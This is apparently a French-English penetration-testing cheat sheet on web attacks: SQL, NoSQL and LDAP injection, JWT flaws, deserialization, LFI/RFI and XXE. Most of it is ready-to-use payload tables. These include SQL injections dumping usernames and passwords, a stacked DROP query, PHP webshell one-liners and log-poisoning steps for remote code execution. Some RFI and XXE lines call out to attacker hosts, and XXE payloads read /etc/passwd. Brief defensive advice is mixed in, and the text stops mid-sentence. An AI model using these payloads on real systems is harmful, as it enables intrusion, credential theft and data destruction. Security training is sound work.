> ![](media/image258.png){width="4.854166666666667in"
> height="2.4583333333333335in"}
>
> **Pour éviter que chacun puisse consulter le courrier des autres
> utilisateurs, l\'accès au MDA est protégé par un nom d\'utilisateur et
> un mot de passe.**
>
> **Les serveurs utilisent les enregistrements MX des serveurs DNS pour
> acheminer le courrier.**
>
> **Par défaut et pour des raisons historiques, il n\'est pas nécessaire
> de s\'authentifier pour envoyer du courrier électronique, ce qui
> signifie qu\'il est très facile d\'envoyer du courrier en falsifiant
> l\'adresse électronique de l\'expéditeur.**
>
> **Exemple session SMTP avec telnet :**

![](media/image406.png){width="5.28125in" height="4.395833333333333in"}

**Un série de codes retour sur trois chiffres est présente pour indiquer
le statut de la demande.**

**Le premier chiffre du code retour indique le statut global de la
demande, les deux autres chiffres donnent le détail du statut :**

**code 2 : la demande a été exécutée sans erreur ;**

**code 3 : la demande est en cours d\'exécution ;**

**code 4 : indique une erreur temporaire ;**

**code 5 : la demande n\'est pas valide et n\'a pas pu être traitée.**

![](media/image410.png){width="6.267716535433071in"
height="2.7222222222222223in"}

-   ## Port Knocking

> **Le tocage à la porte, ou port-knocking, est une méthode permettant
> de modifier le comportement d\'un pare-feu (firewall) en temps réel en
> provoquant l\'ouverture de ports permettant la communication, grâce au
> lancement préalable d\'une suite de connexions sur des ports distincts
> dans le bon ordre, à l\'instar d\'un code frappé à une porte.**
>
> **Cette technique est notamment utilisée pour protéger l\'accès au
> port 22 dédié au Secure shell (SSH) ; elle ne nécessite pas beaucoup
> de ressources et reste facile à mettre en œuvre.**
>
> **La méthode de port-knocking est considérée comme sécurisée étant
> donné qu\'elle est située à un niveau bas des couches TCP/IP et
> qu\'elle ne requière pas de port ouvert (le service knockd est lui
> aussi invisible).**
>
> **Dans linux, parfois la configuration de cette feature peut se situer
> dans le fichier /etc/knockd.conf.**

-   ## Network File System (NFS)

**Network File System (NFS), ou système de fichiers en réseau, est une
application client/serveur qui permet à un utilisateur de consulter et,
éventuellement, de stocker et de mettre à jour des fichiers sur un
ordinateur distant, comme s\'ils étaient sur son propre ordinateur.**

#  Web

-   ## (Se/Deser)-ialisation

###  Some tools

  -----------------------------------------------------------------------
  **ysoserial**                       **A proof-of-concept tool for
                                      generating payloads that exploit
                                      unsafe Java object
                                      deserialization.**
  ----------------------------------- -----------------------------------
  **PHP Generic Gadget Chains**       **Like *ysoserial* for PHP**

  -----------------------------------------------------------------------

-   **Generally speaking, deserialization of user input should be
    avoided unless absolutely necessary. The high severity of exploits
    that it potentially enables, and the difficulty in protecting
    against them, outweigh the benefits in many cases.**

> **If possible, you should avoid using generic deserialization features
> altogether.**

-   ### Identify insecure deserialization :

> **During auditing, you should look at all data being passed into the
> website and try to identify anythin that looks**
>
> **like serialized data.**
>
> **Once you identify serialized data, you can test** **whether**
>
> **you are able to control it.**
>
> **In Java, if you have source code access, take note of**
>
> **any code that uses the readObject() method, which is**
>
> **used to read and deserialize data from an InputStream.**

-   **In some cases of deserialization exploit, you can modify data
    > types in the serialized data to take advantage of an existing
    > loose comparaison in the code ( on password verification, ...) .**

```{=html}
<!-- -->
```
-   **En python, c'est la bibliothèque Pickle qui est utilisée pour la
    > seria/deserialisation ( en format Pickle ).**

> **If an application unserializes data using pickle based on a string
> under your control, you can execute code in the application.**
>
> **Objet de type Pickle :**
>
> **(i\_\_main\_\_**
>
> **Hack**
>
> **(dp1**
>
> **S\'test1\'**
>
> **p2**
>
> **S\'test\'**
>
> **p3**
>
> **sS\'test2\'**
>
> **p4**
>
> **S\'retest\'**
>
> **p5**
>
> **sb.**

-   ### Magic methods

> **Magic methods ( like *\_\_construct()*, *\_\_wakeup()* ) can become
> dangerous when the code that they execute handles
> attacker-controllable data, for example, from a deserialized object.**
>
> **Therefore, if an attacker can manipulate which class of object is
> being passed in as serialized data, they can influence what code is
> executed after ( which magic method of a certain class ).**

-   ### Gadget Chains :

> **In the wild, many insecure deserialization vulnerabilities will only
> be exploitable through the use of gadget chains.**
>
> **﻿Manually identifying gadget chains can be a fairly arduous process.
> Fortunately, there are a few options for working with pre-built gadget
> chains that you can try first.**
>
> **There are several tools available that can help. These tools provide
> a range of pre-discovered gadget chains that have been exploited on
> other websites.**
>
> **It is important to note that it is not the presence of a gadget
> chain in the website\'s code, or any of its libraries, that is
> responsible for the vulnerability.**
>
> **Even if there is no dedicated tool for automatically generating the
> serialized object, you can still find documented gadget chains for
> popular frameworks and adapt them manually.**

-   **Serialized Java objects will always start with : aced00057372.**

```{=html}
<!-- -->
```
-   **XMLDecoder is a Java class that creates objects based on a XML
    > message. If a malicious user can get an application to use
    > arbitrary data in a call to the method readObject, she will
    > instantly gain code execution on the server.**

> **See :
> [[https://pentesterlab.com/exercises/xmldecoder/course]{.underline}](https://pentesterlab.com/exercises/xmldecoder/course)**

-   **The string rO0 ( in base64 ) at the beginning of the string is a
    > good indicator to recognize serialized Java objects.**

```{=html}
<!-- -->
```
-   **To avoid exploitation, you can use JSON object ( encode/decode in
    > json format ) instead of serialized object.**

```{=html}
<!-- -->
```
-   ## JWT (JSON Web Token)

    -   **Vérifier que le header du Jeton ( dans le header ) contient le
        > bon algorithme ( il peut être par exemple à "none","None" ou
        > "NONE" pour que la signature n'est pas pris en compte).**

```{=html}
<!-- -->
```
-   **﻿"jwt_tool" est un outil permettant de bruteforcer une clée sur un
    > JWT.**

```{=html}
<!-- -->
```
-   **Si le token utilise RS256 ( RSA ) , une faille consiste à changer
    > RS256 en HS256 et utiliser une des clefs publiques qui était
    > utilisée pour RSA comme secret.**

```{=html}
<!-- -->
```
-   **Utiliser une bonne fonction de décodage selon la librairie
    > utilisée pour que la signature soit vérifiée ( si on utilise une
    > mauvaise fonction pour décoder le jwt, il se peut que la signature
    > n'est pas vérifiée et donc qu'un attaquant peut mettre ce qu'il
    > veut en tant que data ).**

```{=html}
<!-- -->
```
-   **Sometimes, there is a "Kid" parameter :**

-   ![](media/image35.png){width="1.875in"
    > height="1.3958333333333333in"}

**Often used to retrieve a key from database or file**

> **system.**
>
> **This is done prior to verification of the signature.**
>
> **If this parameter is injectable, you can tell the serveur to use the
> provided file (from its own system directory) as the key for the
> signature.**
>
> **So you can retrieve a known file from the serveur ( it depends on
> the OS) and construct the signature with it and then tell the serveur
> ( from the kid parameter ) that the content of this file is the key to
> verify the token.**
>
> **Example :**
>
> ![](media/image207.png){width="1.9895833333333333in"
> height="1.3854166666666667in"}
>
> **Here, we know the content of /dev/null (it's an empty file). So, we
> can easily reconstruct a valid signature.**
>
> **In the case that a database is used, you can try an SQL injection
> from the parameter because its value is put in a sql request.**
>
> **A signed JWT is known as a JWS (JSON Web Signature). In fact a JWT
> does not exist itself --- either it has to be a JWS or a JWE (JSON Web
> Encryption). It\'s like an abstract class --- the JWS and JWE are
> concrete implementations.**

-   ## SQL injection :

```{=html}
<!-- -->
```
-   **CheatSheet SQL injection :
    > [[https://portswigger.net/web-security/sql-injection/cheat-sheet]{.underline}](https://portswigger.net/web-security/sql-injection/cheat-sheet)**

    -   ### étapes dans une SQLi Union :

        -   **Chercher le nombre de colonne ( pour le UNION )**

        -   **Chercher le type des colonnes**

        -   **Chercher le type de database ( pour connaître la
            > syntaxe)**

        -   **Sortir la liste de toutes les tables présentes ( leurs
            > noms )**

        -   **Chercher le détail du format des tables ( les colonnes )**

        -   **Afficher leurs contenus ( étape simple )**

    -   ### Potentielles étapes pour une BSQLi :

        -   **Trouver la taille du champs voulu.**

        -   **Bruteforcer chaque caractère.**

```{=html}
<!-- -->
```
-   ### Exemples de payloads

+---------------------------------+------------------------------------+
| **' OR 1=1 AND                  | -   **L\'opération AND vient en    |
| ﻿'username'=\'admin\' /\***      |     > premier**                    |
|                                 |                                    |
|                                 | -   **" /\* " ou " \--" ou "#" :   |
|                                 |     > commentaire pour fermer la   |
|                                 |     > suite**                      |
|                                 |                                    |
|                                 | -   **On MySQL, the double-dash    |
|                                 |     > sequence**                   |
|                                 |                                    |
|                                 | > **( "\--" ) must be followed by  |
|                                 | > a space**                        |
+=================================+====================================+
| **SELECT \* FROM table LIMIT 5, | **Cette requête retourne les       |
| 10;**                           | enregistrements 6 à 15 d'une       |
|                                 | table. Le premier nombre est       |
|                                 | l'OFFSET tandis que le suivant est |
|                                 | la limite.**                       |
+---------------------------------+------------------------------------+
| **' UNION SELECT 1,2,3\-- (**   | **Tester si il y a 3 colonnes      |
|                                 | (selon le nombre de chiffres       |
| **TESTER PLUSIEURS ENCHAÎNEMENT | écrits pour le UNION).**           |
| DE CHIFFRE SUR SELECT           |                                    |
| 1,1,1,1.....**                  | **﻿The reason for using NULL as the |
|                                 | values returned from the injected  |
| **OU**                          | SELECT query is that the data      |
|                                 | types in each column must be       |
| **' UNION SELECT                | compatible between the original    |
| NULL,NULL,NULL\--**             | and the injected queries. Since    |
|                                 | NULL is convertible to every       |
| **OU**                          | commonly used data type, using     |
|                                 | NULL maximizes the chance that the |
| **'Order by 3#**                | payload will succeed when the      |
|                                 | column count is correct.**         |
| **OU**                          |                                    |
|                                 | **Obligé de rajouter un FROM sur   |
| **' UNION SELECT NULL,NULL,NULL | un SELECT sur des base de donnée   |
| FROM DUAL \-- ( Pour ORACLE DB  | ORACLE**                           |
| )**                             |                                    |
+---------------------------------+------------------------------------+
| **UNION ALL SELECT              | **Print the content of "index.php" |
| 1,2,3,4                         | as the first**                     |
| ,5,6,load_file(\'FILE_NAME\')** |                                    |
|                                 | **column**                         |
+---------------------------------+------------------------------------+
| **\' UNION SELECT username,     | **Si le SELECT de base est composé |
| password FROM users\--**        | de 2 colonnes et qu'on connaît le  |
|                                 | noms des tables, il est possible   |
|                                 | de récupérer des données si elles  |
|                                 | sont affichées sur la page comme   |
|                                 | dans cette exemple.**              |
+---------------------------------+------------------------------------+
| **\' UNION SELECT username \|\| | **Suppose instead that the basic   |
| \'\~\' \|\| password FROM       | query only returns a single        |
| users\--**                      | column.**                          |
|                                 |                                    |
| **1 UNION SELECT                | **You can easily retrieve multiple |
| 1,c                             | values together within this single |
| oncat(login,\':\',password),3,4 | column by concatenating the values |
| FROM users;**                   | together, ideally including a      |
|                                 | suitable separator to let you      |
| **SELECT login + \'-\' +        | distinguish the combined values.** |
| password FROM members**         |                                    |
|                                 | **This uses the double-pipe        |
|                                 | sequence \|\| which is a string    |
|                                 | concatenation operator on Oracle   |
|                                 | and MySQL ( in particular          |
|                                 | configuration ). The injected      |
|                                 | query concatenates together the    |
|                                 | values of the username and         |
|                                 | password fields, separated by the  |
|                                 | \~ character.**                    |
+---------------------------------+------------------------------------+
| **1 UNION SELECT                | **Version de la database**         |
| 1,@@version,3,4**               |                                    |
|                                 | **Nom de la database**             |
| **1 UNION SELECT                |                                    |
| 1,database(),3,4**              | **Nom du current user**            |
|                                 |                                    |
| **1 UNION SELECT                |                                    |
| 1,current_user(),3,4**          |                                    |
+---------------------------------+------------------------------------+
| **UNION SELECT NULL, NULL,      | **méthode cast() à utiliser pour   |
| NULL, cast(password as          | régler le problème des types des   |
| numeric),**                     | colonnes.**                        |
+---------------------------------+------------------------------------+
| **-1 OR (SELECT SLEEP(3) FROM   | **Time blind sql : Permet de voir  |
| users WHERE id=1 AND 1=1)**     | si l'entré est vulnérable à une    |
|                                 | time blind sql.**                  |
|                                 |                                    |
|                                 | **You can also use pg_sleep(10) (  |
|                                 | PostgreSQL)**                      |
+---------------------------------+------------------------------------+
| **?id=1; IF (LEN(USER)=1)       | **Time based sql to test size of   |
| WAITFOR DELAY \'00:00:10\'**    | data**                             |
|                                 |                                    |
| **\--**                         |                                    |
+---------------------------------+------------------------------------+
| **IF                            | **Time based sql to find each      |
| (ASCII(lo                       | character of the user USER**       |
| wer(substring((USER),1,1)))\>** |                                    |
|                                 | **MySQL Syntax:**                  |
| **97) WAITFOR DELAY             |                                    |
| \'00:00:10\'**                  | ![](media/image276                 |
|                                 | .png){width="3.5104166666666665in" |
|                                 | height="0.3333333333333333in"}     |
|                                 |                                    |
|                                 | **SQL Server Syntax:**             |
|                                 |                                    |
|                                 | ![](media/image176                 |
|                                 | .png){width="3.5104166666666665in" |
|                                 | height="0.3055555555555556in"}     |
|                                 |                                    |
|                                 | **Oracle Syntax:**                 |
|                                 |                                    |
|                                 | ![](media/image241                 |
|                                 | .png){width="3.5104166666666665in" |
|                                 | height="0.6111111111111112in"}     |
|                                 |                                    |
|                                 | **PostgreSQL syntax :**            |
|                                 |                                    |
|                                 | ![](media/image311                 |
|                                 | .png){width="3.5104166666666665in" |
|                                 | height="0.5138888888888888in"}     |
+---------------------------------+------------------------------------+
| **/\*\*/UN/\*                   | **You can use sql inline comments  |
| \*/ION/\*\*/SEL/\*\*/ECT/\*\*/p | sequences to rewrite word**        |
| assword/\*\*/FR/\*\*/OM/\*\*/Us |                                    |
| ers/\*\*/WHE/\*\*/RE/\*\*/usern |                                    |
| ame/\*\*/LIKE/\*\*/\'tom\'\--** |                                    |
+---------------------------------+------------------------------------+
| **/\*! MYSQL Special SQL \*/**  | **This is a special comment syntax |
|                                 | for MySQL. It\'s perfect for       |
|                                 | detecting MySQL version. If you    |
|                                 | put a code into this comment it\'s |
|                                 | going to execute in MySQL only.**  |
+---------------------------------+------------------------------------+
| **SELECT /\*!32302 1/0, \*/ 1   | **Will throw an division by 0      |
| FROM tablename**                | error if MySQL version is higher   |
|                                 | than3.23.02**                      |
+---------------------------------+------------------------------------+
| **SELECT \* FROM members; DROP  | **Executing more than one query in |
| members\--**                    | one transaction ( Stacking Queries |
|                                 | ).**                               |
|                                 |                                    |
|                                 | ![](media/image305                 |
|                                 | .png){width="3.5104166666666665in" |
|                                 | height="1.8333333333333333in"}     |
+---------------------------------+------------------------------------+
| **0xHEXNUMBER**                 | **Very useful for bypassing,       |
|                                 | magic_quotes() and similar         |
| **SELECT CHAR(0x66)**           | filters, or even WAFs.**           |
|                                 |                                    |
| **SELECT 0x5045 ( this is a     |                                    |
| string )**                      |                                    |
|                                 |                                    |
| **SELECT 0x50 + 0x45 ( this is  |                                    |
| a integer )**                   |                                    |
+---------------------------------+------------------------------------+
| **SELECT                        | **This will return \'KLM\'.**      |
| CONCA                           |                                    |
| T(CHAR(75),CHAR(76),CHAR(77))** |                                    |
|                                 |                                    |
| **SELECT                        |                                    |
| CHAR(75)+CHAR(76)+CHAR(77)**    |                                    |
|                                 |                                    |
| **SELECT                        |                                    |
| CHR(75)\|\|CHR(76)\|\|CHR(77)** |                                    |
|                                 |                                    |
| **SELECT                        |                                    |
| (CHaR                           |                                    |
| (75)\|\|CHaR(76)\|\|CHaR(77))** |                                    |
+---------------------------------+------------------------------------+
| **SELECT ASCII(\'abbas\')**     | **this returns the ASCII number of |
|                                 | the first character ( 'a' =\> 97   |
|                                 | ).**                               |
+---------------------------------+------------------------------------+
| **BENCHMARK(howmanytimes, do    | **function Syntax on benchmark.**  |
| this)**                         |                                    |
+---------------------------------+------------------------------------+
| **SELECT MID(\"SQL Tutorial\",  | **Extract a substring from a       |
| 5, 3) AS ExtractString;**       | string ( in this example : start   |
|                                 | at position 5, extract 3           |
|                                 | characters):**                     |
|                                 |                                    |
|                                 | **same function ; SUBSTR() and     |
|                                 | SUBSTRINGS()**                     |
+---------------------------------+------------------------------------+
| **1\' AND (SELECT               | **Using LENGTH() (                 |
| LENGTH(database()))=1#**        | LEN(),DATALENGTH() ) function is   |
|                                 | possible to know the length of a   |
|                                 | string in a SQL query.**           |
+---------------------------------+------------------------------------+
| **ASCII(\'a\')**                | **ASCII() - returns the ASCII      |
|                                 | value from a character**           |
| **Return: 97**                  |                                    |
+---------------------------------+------------------------------------+
| **xyz\' union select case when  | **Blind error based SQLi pour      |
| (username = \'Administrator\'   | chercher les caractères du         |
| and SUBSTRING(password, 1, 1)   | password de l'admin**              |
| \> \'m\') then 1/0 else null    |                                    |
| end from users\--**             |                                    |
+---------------------------------+------------------------------------+
| **to_char(1/5)**                | **convertir en chaine de           |
|                                 | caractere**                        |
+---------------------------------+------------------------------------+
| **LIMIT**                       | **if the developer checked that    |
|                                 | only one result is return by the   |
|                                 | database.**                        |
+---------------------------------+------------------------------------+
| **a                             | **%09 = tabulation**               |
| dmin'%09or%"091%09=%091%09\--** |                                    |
|                                 | **You can use tabulation instead   |
|                                 | of spaces if it's filtered**       |
+---------------------------------+------------------------------------+
|                                 |                                    |
+---------------------------------+------------------------------------+
|                                 |                                    |
+---------------------------------+------------------------------------+
|                                 |                                    |
+---------------------------------+------------------------------------+

-   **For blind SQL , sometimes you have to modify the query so that it
    > will cause a database error if the condition is true, but not if
    > the condition is false.**

**example : xyz\' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL
END\--**

-   **It's good to use UNION with ALL.**

```{=html}
<!-- -->
```
-   ### LDAP injection

![](media/image233.png){width="6.267716535433071in"
height="2.9305555555555554in"}

**Some useful commands for LDAP injection**

  ----------------------------------- -----------------------------------
                                      

                                      

                                      

                                      

                                      
  ----------------------------------- -----------------------------------

-   ### MongoDB injection

> **With MongoDB, the data isn't stored in row and columns. It's
> different from other communs database systems.**

**Some useful commands for MongoDB injection**

+-----------------------------------+-----------------------------------+
| **admin' \|\| '1' == '1**         | **Almost same as SQLi**           |
+===================================+===================================+
| **// , \<'\--**                   | **Commentaire**                   |
+-----------------------------------+-----------------------------------+
| **admin' &&                       | **example of Payload**            |
| th                                |                                   |
| is.password.match(\[REGEX\])%00** | **In case the password field does |
|                                   | not exist for some records (since |
| **\... && this.password &&        | it\'s a NoSQL database), it\'s    |
| this.password.match(\...**        | always a good idea to ensure its  |
|                                   | presence by using that.**         |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

![](media/image143.png){width="6.267716535433071in"
height="2.6944444444444446in"}

**La fonction ﻿"htmlspecialchars" protège de certaines injections SQL :
elle filtre les caractère : & " ' \< \>.**

![](media/image303.png){width="6.267716535433071in"
height="4.458333333333333in"}![](media/image230.png){width="6.041666666666667in"
height="2.1770833333333335in"}

-   **Pour le premier select, on peut remplacer "\*" par "TABLE_NAME".**

-   **Pour le deuxième select, on peut remplacer "\*" par
    > "COLUMN_NAME".**

```{=html}
<!-- -->
```
-   **Blind SQL injection vulnerabilities :**

> **Depending on the nature of the vulnerability and the database
> involved, the following techniques can be used to exploit blind SQL
> injection vulnerabilities:**

-   **With condition ( if ... )**

-   **Time delay**

-   **Trigger an out-of-band network interaction**

**A SQL injection provides the same level of access as the user used by
the application to connect to the database (current_user())\... That is
why it is always important to provide the lowest privileges possible to
this user when you deploy a web application.**

-   ### SQL Truncation :

    -   example :

> ![](media/image84.png){width="3.03125in"
> height="1.3854166666666667in"}
>
> Ici, avec cette table dans l'application, on peut essayer recréer un
> autre compte admin en jouant sur la taille : "admin" + " " \*7 +
> "blabla".
>
> Ici ce pseudo sera tronqué à la création sur 12 octets ( sa taille MAX
> ) et donc sa valeur deviendra juste "admin".

**\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--**

-   ## Open Redirect

> **Open Redirect vulnerabilities allows you to redirect the victim to a
> malicious website. They are low impact vulnerabilities in most cases
> unless you can use them to leak Oauth tokens.**

### Some payload

  -----------------------------------------------------------------------
  **//www.\[URL...\]**                **If you have to begin le value by
                                      "/" ( because the developer chose
                                      that to only redirect to URL inside
                                      of the site ) you can just begin a
                                      URL with "//"**
  ----------------------------------- -----------------------------------
                                      

                                      

                                      

                                      

                                      

                                      
  -----------------------------------------------------------------------

-   ## LFI/RFI :

### Some payloads

+----------------------------------+-----------------------------------+
| **?page=                         | **Affiche le contenu du fichier   |
| [php://filter/read=c             | "lfi.php" encodé en Base64.**     |
| onvert.base64-encode/resource=lf |                                   |
| i.php](http://localhost/lfi.php? |                                   |
| page=php://filter/read=convert.b |                                   |
| ase64-encode/resource=lfi.php)** |                                   |
+==================================+===================================+
| **?page= php://input**           | **Utilise le payload écrit dans   |
|                                  | les paramètres POST d'une         |
| **.....**                        | requête.**                        |
|                                  |                                   |
| **\<?php system(" ls -lA") ?\>** |                                   |
+----------------------------------+-----------------------------------+
| ![](media/image313.p             | **Upload a Zip file with a PHP    |
| ng){width="3.8281255468066493in" | Shell inside and execute it.**    |
| height="1.125in"}                |                                   |
|                                  | **phar:// fait à peu près la même |
|                                  | chose**                           |
|                                  |                                   |
|                                  | **%23 = \#**                      |
+----------------------------------+-----------------------------------+
| **?page=expect://\[COMMAND\]**   | **"Expect" has to be activated.   |
|                                  | You can execute code using        |
|                                  | this.**                           |
+----------------------------------+-----------------------------------+
| **[[?page=data://text/plain;bas  | **Dans cette exemple, la chaîne   |
| e64,](http://localhost/rfi.php?p | codée en base64 ( qui est un      |
| age=data://text/plain;base64,RXh | script php ) sera exécuté et      |
| wbG9pdCBEYXRhVVJJIGluY2x1c2lvbg= | l'affichage de résultat sera sur  |
| =)[PD9waHAgcGhwaW5mbygpOz8%2B](h | la page web**                     |
| ttp://localhost/lfi.php?page=dat |                                   |
| a://text/plain;base64,PD9waHAgcG |                                   |
| hwaW5mbygpOz8%2B)]{.underline}** |                                   |
+----------------------------------+-----------------------------------+
| [**[                             | **"exploit.php" sera exécuté. (   |
| ?page=http://serveur-pirate.net/ | sans Wrapper PHP )**              |
| exploit.php]{.underline}**](http |                                   |
| ://localhost/rfi.php?page=http:/ |                                   |
| /serveur-pirate.net/exploit.php) |                                   |
+----------------------------------+-----------------------------------+
| **[....]{.underline}**           | **XML External Entity Attack (    |
|                                  | XXE ).**                          |
| **[\<!ENTITY exploit SYSTEM      |                                   |
| \                                | **à bien placer dans le fichier   |
| "php://filter/read=convert.base6 | XML en question.**                |
| 4-decode/resource=<http://site-p |                                   |
| iege/payload>\"\>]{.underline}** |                                   |
|                                  |                                   |
| **[.....]{.underline}**          |                                   |
+----------------------------------+-----------------------------------+
|                                  |                                   |
+----------------------------------+-----------------------------------+
|                                  |                                   |
+----------------------------------+-----------------------------------+

###  RCE via Log poisoning

Step :

-   Envoyez du code PHP dans le fichier log :

    -   En accédant à l'url /\<?php system(\$\_GET\[\'cmd\'\]);?\> par
        > exemple

-   Inclure le fichier log via la RFI/LFI, ce qui va exécuter le code
    > php

![](media/image55.png){width="3.7916666666666665in" height="0.34375in"}

###  RCE via Proc Environ Injection

-   Ecrire du code php dans le User-Agent

-   Inclure le fichier /proc/self/environ : This file hosts the initial
    > environment of the Apache process. Thus, the environmental
    > variable User-Agent is likely to appear there. Ce qui va exécuter
    > le code php

![](media/image220.png){width="3.2291666666666665in"
height="1.1145833333333333in"}

### RCE via SSH Log Poisoning

-   Try to connect to ssh on the target server : ssh \'\<?php
    > system(\$\_GET\[\'c\'\]); ?\>\'@192.168.1.129

-   The php code will be wrote in the log file ( /var/log/auth.log )

> ![](media/image398.png){width="5.889763779527559in"
> height="1.8055555555555556in"}

-   payloads :
    > 192.168.1.129/lfi/lfi.php?file=////var/log/auth.log&c=\[RCE\]

### RCE via SMTP Log Poisoning

-   Try to connect to the SMTP (25) port : telnet 192.168.1.107 25

-   Now let's try to send a mail via the command line (CLI) of this
    > machine and send the OS commands via the "RCPT TO" option :

> ![](media/image63.png){width="3.6354166666666665in" height="0.6875in"}

-   Final payload :
    > 192.168.1.107/lfi/lfi.php?file=/var/log/mail.log&c=ifconfig

```{=html}
<!-- -->
```
-   ### How to Detect

```{=html}
<!-- -->
```
-   **Détecter si une entrée utilisateur est vulnérable aux LFI/ RFI**

> **en PHP :**

-   **Via la configuration PHP :**

```{=html}
<!-- -->
```
-   **"allow_url_open" :**

> **Permet la récupération de ressources distantes si**
>
> **sa valeur vaut "1" ou "On".**

-   **"allow_url_include" :**

> **Permet l'inclusion de ressources distantes ainsi**
>
> **que le support des wrappers PHP si sa valeur vaut**
>
> **"1" ou "On".**

-   **Via le code applicatif :**

> **Il suffit de regarder chaque occurrence d'appel aux fonctions
> suivantes :**

-   [**[include()]{.underline}**](http://php.net/manual/fr/function.include.php)

-   [**[require()]{.underline}**](http://php.net/manual/fr/function.require.php)

-   [**[include_once()]{.underline}**](http://php.net/manual/fr/function.include-once.php)

-   [**[require_once()]{.underline}**](http://php.net/manual/fr/function.require-once.php)

> **Et vérifier si le paramètre passé à la fonction est**
>
> **directement ou indirectement une entrée utilisateur.**

-   ## XML external entity (XXE) injection

    -   **﻿XXE vulnerabilities arise because the XML specification
        > contains various potentially dangerous features, and standard
        > parsers support these features even if they are not normally
        > used by the application.**

```{=html}
<!-- -->
```
-   **Exploiting XXE to retrieves files :**

    -   **To perform this kind of injection, ﻿you need to modify the
        > submitted XML in two ways:**

```{=html}
<!-- -->
```
-   **Introduce (or edit) a DOCTYPE element (DTD ) that defines an
    > external entity containing the path to the file.**

-   **Edit a data value in the XML that is returned in the
    > application\'s response, to make use of the defined external
    > entity.**

    -   **For example, suppose a shopping application checks for the
        > stock level of a product by submitting the following XML to
        > the server:**

> **\<?xml version=\"1.0\" encoding=\"UTF-8\"?\>**
>
> **\<stockCheck\>\<productId\>381\</productId\>\</stockCheck\>**
>
> **The application performs no particular defenses against XXE attacks,
> so you can exploit the XXE vulnerability to retrieve the /etc/passwd
> file by submitting the following XXE payload:**
>
> **\<?xml version=\"1.0\" encoding=\"UTF-8\"?\>**
>
> **\<!DOCTYPE foo \[ \<!ENTITY xxe SYSTEM \"file:///etc/passwd\"\>
> \]\>**
>
> **\<stockCheck\>\<productId\>&xxe;\</productId\>\</stockCheck\>**

-   **Note : ﻿With real-world XXE vulnerabilities, there will often be a
    > large number of data values within the submitted XML, any one of
    > which might be used within the application\'s response. To test
    > systematically for XXE vulnerabilities, you will generally need to
    > test each data node in the XML individually, by making use of your
    > defined entity and seeing whether it appears within the
    > response.**

![](media/image195.png){width="6.267716535433071in" height="2.5in"}

![](media/image253.png){width="7.366839457567804in"
height="6.412331583552056in"}

**Scénario associée :**

![](media/image224.png){width="6.267716535433071in" height="3.125in"}

![](media/image126.png){width="6.267716535433071in" height="3.0in"}

![](media/image332.png){width="6.267716535433071in"
height="4.180555555555555in"}

![](media/image320.png){width="6.267716535433071in"
height="2.8055555555555554in"}

![](media/image274.png){width="6.267716535433071in"
height="3.0972222222222223in"}

-   **XXE attacks via modified content type :**

    -   **Most POST requests use a default content type that is
        > generated by HTML forms, such as
        > application/x-www-form-urlencoded. Some web sites expect to
        > receive requests in this format but will tolerate other
        > content types, including XML.**

> **For example, if a normal request contains the following:**
>
> **POST /action HTTP/1.0**
>
> **Content-Type: application/x-www-form-urlencoded**
>
> **Content-Length: 7**
>
> **foo=bar**
>
> **Then you might be able submit the following request, with the same
> result:**
>
> **POST /action HTTP/1.0**
>
> **Content-Type: text/xml**
>
> **Content-Length: 52**
>
> **\<?xml version=\"1.0encoding=\"UTF-8\"?\>\<foo\>bar\</foo\>**
>
> **and then you create your own payload.**

-   **Une DTD décrit la grammaire du document --- liste des éléments (ou
    > balises), des attributs, leur contenu et leur agencement --- ainsi
    > que le vocabulaire supplémentaire sous la forme d\'une liste
    > d\'Entité de caractère.**

> **The DTD is declared within the optional DOCTYPE element at the start
> of the XML document. The DTD can be fully self-contained within the
> document itself (known as an \"internal DTD\"( quand s'est écrit à
> l\'intérieur du document )) or can be loaded from elsewhere (known as
> an \"external DTD\") or can be hybrid of the two.**

![](media/image257.png){width="6.267716535433071in"
height="5.180555555555555in"}

-   **XML stands for \"extensible markup language\".This is a language
    > designed for storing and transporting data.**

> **Its popularity has now declined in favor of the JSON format.**

-   **f**

**Some interesting payload**

+-----------------------------------+-----------------------------------+
| **\<!DOCTYPE foo \[ \<!ENTITY xxe | **XXE to perform SSRF attacks**   |
| SYSTEM                            |                                   |
| \"http://int                      |                                   |
| ernal.vulnerable-website.com/\"\> |                                   |
| \]\>**                            |                                   |
+===================================+===================================+
| **\<foo                           | **Xinclude attack**               |
| xmlns:xi=\"http                   |                                   |
| ://www.w3.org/2001/XInclude\"\>** |                                   |
|                                   |                                   |
| **\<xi:include parse=\"text\"     |                                   |
| href=\"                           |                                   |
| file:///etc/passwd\"/\>\</foo\>** |                                   |
+-----------------------------------+-----------------------------------+
| **\<?xml version=\"1.0\"          | **XXE via image format SVG**      |
| standalone=\"yes\"?\>\<!DOCTYPE   |                                   |
| test \[ \<!ENTITY xxe SYSTEM      | **\<- Donnée d'une image au       |
| \"file:///etc/hostname\" \>       | format SVG. Ce format prend en    |
| \]\>\<svg width=\"128px\"         | compte du XML.**                  |
| height=\"128px\"                  |                                   |
| xml                               |                                   |
| ns=\"http://www.w3.org/2000/svg\" |                                   |
| xmlns:xlink                       |                                   |
| =\"http://www.w3.org/1999/xlink\" |                                   |
| version=\"1.1\"\>\<text           |                                   |
| font-size=\"16\" x=\"0\"          |                                   |
| y                                 |                                   |
| =\"16\"\>&xxe;\</text\>\</svg\>** |                                   |
+-----------------------------------+-----------------------------------+
| **\<!DOCTYPE foo \[ \<!ENTITY %   | **Sometimes, XXE attacks using    |
| xxe SYSTEM                        | regular entities are blocked, due |
| \"http:/                          | to some input validation by the   |
| /f2g9j7hhkax.web-attacker.com\"\> | application or some hardening of  |
| %xxe; \]\>**                      | the XML parser that is being      |
|                                   | used. In this situation, you      |
|                                   | might be able to use XML          |
|                                   | parameter entities instead. XML   |
|                                   | parameter entities are a special  |
|                                   | kind of XML entity which can only |
|                                   | be referenced elsewhere within    |
|                                   | the DTD.**                        |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

**Disabling the Document Type Definitions (DTDs) function will
effectively prevent most attacks.**

**When possible, handling data using simpler formats like JSON is
